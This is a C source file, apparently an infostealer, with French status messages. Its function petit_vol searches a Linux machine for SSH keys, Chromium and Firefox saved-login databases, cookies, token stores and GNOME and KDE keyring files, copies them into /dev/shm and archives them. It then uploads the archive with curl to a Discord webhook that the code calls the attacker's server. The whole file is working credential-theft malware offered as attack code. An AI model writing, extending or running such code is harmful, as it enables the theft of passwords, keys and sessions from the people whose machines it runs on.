#include <stdio.h>
#include <stdlib.h>

#define BLACK       "\033[30m"
#define RED         "\033[31m"
#define GREEN       "\033[32m"
#define YELLOW      "\033[33m"
#define BLUE        "\033[34m"
#define MAGENTA     "\033[35m"
#define CYAN        "\033[36m"
#define WHITE       "\033[37m"
#define RESET       "\033[0m"

int petit_vol(void)
{ 

    
    printf(""BLUE"\n\nON COMMENCE L'EXFILTRATION DES DONNEES\n\n"RESET"");

    printf(""CYAN"Creation du dossier qui contiendra les donnes a exfiltre\n"RESET"");
    int status = system("mkdir -p /dev/shm/agentpathogeneishere");
    if (status == -1)
    {
        printf(""RED"Erreur critique lors de la creation du dossier d'exfiltration\n"RESET"");
        return 1;
    }
    else
    {
        if(WIFEXITED(status))
        {
            int code_retour = WEXITSTATUS(status);
            if (code_retour == 0)
            {
                printf(""GREEN"Dossier d exfiltration cree avec succes\n\n"RESET"");
            }
            else if (code_retour == 127)
            {
                printf(""RED"Echec utilitaire ou commande introuvable\n"RESET"");
            }
            else
            {
                printf(""YELLOW"Echec de la commande code d'erreur :"RESET""RED"%d\n"RESET"",code_retour);
            }
        }
        else if(WIFSIGNALED(status))
        {
            printf(""YELLOW"La command a ete interrompu par le signal :"RESET""RED" %d\n"RESET"",WTERMSIG(status));
        }
        
    }

    


    printf("--------------------------------------------\n\n");
    printf(""MAGENTA"RECONNAISSANCE CLES SSH"RESET" "GREEN"(DONNE LEGERE ET PRECIEUSE)\n\n"RESET"");
    printf(CYAN"\n\n"RESET);
    system("find  / -type d -name '*.ssh' -exec cp -r --parents {} /dev/shm/agentpathogeneishere \\;  2>/dev/null");

    printf(""MAGENTA"RECONNAISSANCE BASE DE DONNEE : Chromium / Google Chrome / Brave / Opera"RESET" "GREEN"(DONNE LEGERE ET PRECIEUSE)\n\n"RESET"");
    printf(CYAN"\n\n"RESET);
    system("find ~ -type f -name 'Login Data' -exec cp -r --parents {} /dev/shm/agentpathogeneishere \\;  2>/dev/null");
    printf("\n--------------------------------------------\n\n");


    printf(""MAGENTA"RECONNAISSANCE BASE DE DONNEE : Firefox"RESET" "GREEN"(DONNE LEGERE ET PRECIEUSE)\n\n"RESET"");
    printf(CYAN"\n\n"RESET);
    system("find ~ -type f  -name 'logins.json' -o -name 'key4.db'  -exec cp -r --parents {} /dev/shm/agentpathogeneishere \\;  2>/dev/null");
    printf("\n--------------------------------------------\n\n");


    printf(""MAGENTA"RECONNAISSANCE BASE DE DONNEE :(Fichiers de cookies, sessions de navigateurs et jetons)"RESET" "GREEN"(DONNE LEGERE ET PRECIEUSE)\n\n"RESET"");
    printf(CYAN"\n\n"RESET);
    system("find ~ -type f  -name 'Cookies' -o -name 'cookies.sqlite'  -exec cp -r --parents {} /dev/shm/agentpathogeneishere \\; 2>/dev/null");
    printf("\n--------------------------------------------\n\n");
    system("find ~/.config -type f  -name '*.ldb'  -exec cp -r --parents {} /dev/shm/agentpathogeneishere \\; 2>/dev/null");
    printf("\n--------------------------------------------\n\n");


    printf(""MAGENTA"RECONNAISSANCE BASE DE DONNEE : GESTIONAIRE DE CLE : (GNOME Keyring / KWallet)"RESET" "GREEN"(DONNE LEGERE ET PRECIEUSE)\n\n"RESET"");
    printf(CYAN"\n\n"RESET);
    system("find ~/.local/share/keyrings -type f -name '*.keyring'  -exec cp -r --parents {} /dev/shm/agentpathogeneishere \\; 2>/dev/null");
    printf("\n--------------------------------------------\n\n");


    printf(""MAGENTA"RECONNAISSANCE BASE DE DONNEE : GESTIONAIRE DE CLE : (KDE Wallet)"RESET" "GREEN"(DONNE LEGERE ET PRECIEUSE)\n\n"RESET"");
    printf(CYAN"\n\n"RESET);
    system("find ~/.local/share/kwalletd -type f -name '*.kwl'  -exec cp -r --parents {} /dev/shm/agentpathogeneishere \\; 2>/dev/null");
    printf("\n--------------------------------------------\n\n\n");

    printf("BUTIN FINAL\n");
    printf("\n--------------------------------------------\n\n\n");
    printf(CYAN"\n\n"RESET);
    system("ls -R -a -F /dev/shm/agentpathogeneishere/");

    printf(""YELLOW"\n\nCompression du dossier de donnees\n"RESET"");
    system("tar -czf /dev/shm/archive_data.tar.gz -C /dev/shm/ agentpathogeneishere 2>/dev/null && rm -rf /dev/shm/agentpathogeneishere");


    printf("\n"GREEN"EXFILTRATION DES DONNES SUR LE SERVER DISCORD DE L'ATTAQUANT\n\n"RESET"");
    system("curl -F \"file=@/dev/shm/archive_data.tar.gz\" https://discord.com/api/webhooks/ID/TOKEN 2>/dev/null");




    return 0;
}

//TO COMPILE BASIC_IMAGE
/*int main (void)
{

    petit_vol();
    return 0;
}*/

